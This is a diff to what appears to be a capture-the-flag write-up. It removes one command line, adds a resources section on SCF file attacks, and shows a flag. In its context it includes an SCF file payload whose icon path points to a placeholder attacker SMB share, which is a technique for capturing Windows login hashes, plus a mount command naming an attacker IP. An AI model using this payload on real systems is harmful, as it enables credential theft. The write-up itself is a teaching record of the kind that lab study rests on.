@@ -158,7 +158,6 @@ $ sudo mount.cifs //Attacker_IP_Adress/compta ./LocalFolder -o user=Anonymous,ui
 ```
 
 ```console
-$ cat file.scf
 [shell]
 command=2
 IconFile=\\Our_IP_Address\\compta\\hacked.ico
@@ -191,3 +190,8 @@ Proof of concept.
 ![](./img-05.png)
 
 **Flag:** **`Tom_Sesco-68dzkyr35ix5gufsp0i3zttdm44e91y8`**
+
+## Resources
+
+- [SCF File Attacks 1](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) 
+- [SCF File Attacks 2](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
